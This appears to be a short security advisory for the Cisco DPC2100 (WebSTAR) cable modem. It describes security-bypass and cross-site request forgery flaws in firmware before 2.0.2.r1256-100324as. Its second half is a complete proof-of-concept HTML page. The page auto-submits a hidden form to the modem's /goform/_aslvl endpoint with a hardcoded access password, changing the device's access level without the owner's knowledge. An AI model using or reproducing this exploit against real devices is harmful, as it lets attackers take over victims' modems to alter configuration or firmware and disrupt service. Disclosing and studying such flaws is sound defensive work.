source: https://www.securityfocus.com/bid/40346/info

Cisco DPC2100 (formerly Scientific Atlanta DPC2100) is prone to multiple security-bypass and cross-site request-forgery vulnerabilities.

Successful exploits may allow attackers to run privileged commands on the affected device, change configuration settings, modify device firmware, cause denial-of-service conditions, or inject arbitrary script code. Other attacks are also possible.

Firmware versions prior to 2.0.2.r1256-100324as are vulnerable. 

<html> <head> <title>Test for CSRF vulnerability in WebSTAR modems</title> </head> <body> <form name="csrf" method="post" action="http://192.168.100.1/goform/_aslvl"> <input type="hidden" name="SAAccessLevel" value="0"> <input type="hidden" name="SAPassword" value="W2402"> </form> <script>document.csrf.submit()</script> </body> </html>